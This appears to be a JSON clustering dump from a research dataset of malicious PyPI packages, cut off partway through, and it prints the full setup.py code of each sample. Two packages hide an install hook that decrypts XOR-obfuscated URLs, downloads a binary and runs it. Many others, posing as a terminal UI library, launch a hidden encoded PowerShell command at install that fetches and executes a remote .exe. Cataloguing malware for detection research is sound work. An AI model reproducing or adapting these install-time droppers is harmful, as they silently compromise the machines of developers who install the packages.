[
  {
    "cluster_id": 0,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-17-reallydonothing-v0.3",
        "code": "from setuptools import setup, find_packages\nimport subprocess\nimport platform\nfrom setuptools.command.install import install\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom typing import Generator\n\nBASE = Path(\"/Library/Application Support\")\nVAR1 = bytes(\n    [\n        236,\n        182,\n        155,\n        98,\n        189,\n        85,\n        144,\n        160,\n        85,\n        42,\n        240,\n        252,\n        248,\n        18,\n        105,\n        35,\n        83,\n        101,\n        252,\n        135,\n        157,\n        141,\n        127,\n        172,\n        138,\n        171,\n        228,\n        92,\n        62,\n        105,\n        30,\n        141,\n    ]\n)\nVAR2 = bytes(\n    [\n        153,\n        113,\n        11,\n        35,\n        175,\n        158,\n        151,\n        3,\n        246,\n        35,\n        79,\n        5,\n        216,\n        146,\n        104,\n        19,\n        2,\n        247,\n        145,\n        193,\n        210,\n        242,\n        138,\n        119,\n        173,\n        116,\n        153,\n        199,\n        9,\n        239,\n        121,\n        47,\n        184,\n        16,\n        193,\n        247,\n        48,\n        94,\n        210,\n        59,\n        156,\n        247,\n        6,\n        146,\n        137,\n        49,\n        47,\n        33,\n        109,\n        56,\n        104,\n        130,\n        89,\n        247,\n        243,\n        203,\n        169,\n        57,\n        137,\n        138,\n        241,\n        155,\n        58,\n        200,\n        44,\n    ]\n)\nVAR3 = bytes(\n    [\n        51,\n        62,\n        147,\n        93,\n        150,\n        141,\n        168,\n        1,\n        112,\n        240,\n        226,\n        170,\n        183,\n        111,\n        17,\n        104,\n        28,\n        94,\n        185,\n        16,\n        206,\n        9,\n        25,\n        227,\n        242,\n        50,\n        19,\n        57,\n        171,\n        216,\n        121,\n        246,\n        181,\n        101,\n        86,\n        101,\n        33,\n        38,\n        198,\n        51,\n        144,\n        219,\n        94,\n        69,\n        80,\n        90,\n        52,\n        9,\n        5,\n        183,\n        215,\n        86,\n        181,\n        35,\n        182,\n        233,\n        51,\n        195,\n        81,\n        73,\n        152,\n        5,\n        210,\n        170,\n        2,\n        189,\n    ]\n)\n\nSTRING1 = \"railroad\"\nSTRING2 = \"jewel\"\nSTRING3 = \"drown\"\nSTRING4 = \"archive\"\n\n\ndef function_gen(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n\n        yield b\n\n\ndef CustomRun(path: bytes, /) -> None:\n    function1 = function_gen(STRING2.encode(\"utf-8\") + path)\n    function2 = function_gen(STRING3.encode(\"utf-8\") + path)\n    function3 = function_gen(STRING4.encode(\"utf-8\") + path)\n    \n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    \n    url1 = ''.join(chr(b ^ k) for b, k in zip(VAR2, function2))\n    url2 = ''.join(chr(b ^ k) for b, k in zip(VAR3, function3))\n\n    url = {\n        \"x86_64\": url1,\n        \"arm64\": url2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for b, k in zip(buf, function1):\n        out.append(b ^ k)\n\n    binary_path = os.path.join(local_bin_path, 'donothing')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    with open('/tmp/testing', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in BASE.glob(\"t*/*O*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n\n            to_hash = STRING1.encode(\"utf-8\") + path_bytes\n            function = function_gen(to_hash)\n\n            first_n_bytes = bytes([next(function) for _ in range(32)])\n\n            if first_n_bytes == VAR1:\n                CustomRun(path_bytes)\n                break\n\n\nsetup(\n    name='reallydonothing',\n    version='0.3',\n    license='MIT',\n    packages=find_packages(),\n    cmdclass={'install': InstallCommand},\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-20-jupyter-calendar-extension-v0.1",
        "code": "from setuptools import setup, find_packages\nimport subprocess\nimport platform\nfrom setuptools.command.install import install\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom typing import Generator\n\nBASE = Path(\"/Users/Shared\")\nVAR1 = bytes(\n    [\n        141,\n        207,\n        27,\n        92,\n        41,\n        11,\n        116,\n        99,\n        201,\n        171,\n        144,\n        68,\n        162,\n        133,\n        198,\n        82,\n        229,\n        71,\n        155,\n        36,\n        52,\n        78,\n        127,\n        184,\n        39,\n        218,\n        232,\n        64,\n        126,\n        7,\n        117,\n        40,\n    ]\n)\nVAR2 = bytes(\n    [\n        181,\n        38,\n        233,\n        112,\n        223,\n        48,\n        57,\n        172,\n        250,\n        236,\n        231,\n        198,\n        246,\n        185,\n        126,\n        188,\n        101,\n        42,\n        151,\n        69,\n        10,\n        211,\n        137,\n        217,\n        36,\n        162,\n        165,\n        215,\n        74,\n        208,\n        237,\n        190,\n        14,\n        30,\n        75,\n        246,\n        36,\n        90,\n        148,\n        171,\n        208,\n        63,\n        131,\n        81,\n        209,\n        199,\n        251,\n        71,\n        212,\n        124,\n        15,\n        224,\n        101,\n        209,\n        7,\n        162,\n        208,\n        93,\n        172,\n        0,\n        49,\n        112,\n        72,\n        194,\n        54,\n        169,\n        79,\n        79,\n        171,\n        102,\n        86,\n        105,\n        184,\n    ]\n)\nVAR3 = bytes(\n    [\n        77,\n        157,\n        244,\n        167,\n        42,\n        69,\n        193,\n        139,\n        133,\n        28,\n        217,\n        82,\n        61,\n        124,\n        156,\n        69,\n        131,\n        96,\n        161,\n        152,\n        123,\n        122,\n        122,\n        121,\n        91,\n        65,\n        139,\n        88,\n        78,\n        140,\n        221,\n        205,\n        23,\n        144,\n        228,\n        117,\n        115,\n        244,\n        2,\n        109,\n        210,\n        156,\n        126,\n        14,\n        102,\n        140,\n        178,\n        153,\n        13,\n        162,\n        128,\n        175,\n        135,\n        212,\n        84,\n        216,\n        103,\n        158,\n        231,\n    ]\n)\nSTRING1 = \"craft\"\nSTRING2 = \"ribbon\"\nSTRING3 = \"effect\"\nSTRING4 = \"jacket\"\n\n\ndef gen(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n\n        yield b\n\n\ndef CustomRun(path: bytes, /) -> None:\n    stream1 = gen(STRING2.encode(\"utf-8\") + path)\n    stream2 = gen(STRING3.encode(\"utf-8\") + path)\n    stream3 = gen(STRING4.encode(\"utf-8\") + path)\n    \n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    \n    url1 = ''.join(chr(b ^ k) for b, k in zip(VAR2, stream2))\n    url2 = ''.join(chr(b ^ k) for b, k in zip(VAR3, stream3))\n\n    url = {\n        \"x86_64\": url1,\n        \"arm64\": url2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for b, k in zip(buf, stream1):\n        out.append(b ^ k)\n\n    binary_path = os.path.join(local_bin_path, 'jupyter_calendar')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    with open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in BASE.glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n\n            to_hash = STRING1.encode(\"utf-8\") + path_bytes\n            stream = gen(to_hash)\n\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n\n            if first_n_bytes == VAR1:\n                CustomRun(path_bytes)\n                break\n\n\nsetup(\n    name='jupyter-calendar-extension',\n    version='0.1',\n    license='MIT',\n    packages=find_packages(),\n    cmdclass={'install': InstallCommand},\n)\n"
      }
    ]
  },
  {
    "cluster_id": 1,
    "size": 168,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqinfostrget-v8.25",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqinfostrget',\n    packages = ['modlib'],\n    version = '3.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqnvidiapywpip-v2.81",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqnvidiapywpip',\n    packages = ['modlib'],\n    version = '10.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqultralgtbhydra-v8.19",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqultraLGTBhydra',\n    packages = ['modlib'],\n    version = '7.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libcpupywmine-v2.9",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcpupywmine',\n    packages = ['modlib'],\n    version = '7.87',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqcandysplitpep-v8.82",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcandysplitpep',\n    packages = ['modlib'],\n    version = '6.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqccstudyhacked-v2.4",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqccstudyhacked',\n    packages = ['modlib'],\n    version = '6.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqcontrolgrandsplit-v2.94",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcontrolgrandsplit',\n    packages = ['modlib'],\n    version = '8.36',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqcontrolhttphttp-v5.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcontrolhttphttp',\n    packages = ['modlib'],\n    version = '1.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqcpugrandpong-v1.41",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcpugrandpong',\n    packages = ['modlib'],\n    version = '2.1',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqcpustudyhydra-v1.64",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcpustudyhydra',\n    packages = ['modlib'],\n    version = '6.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: 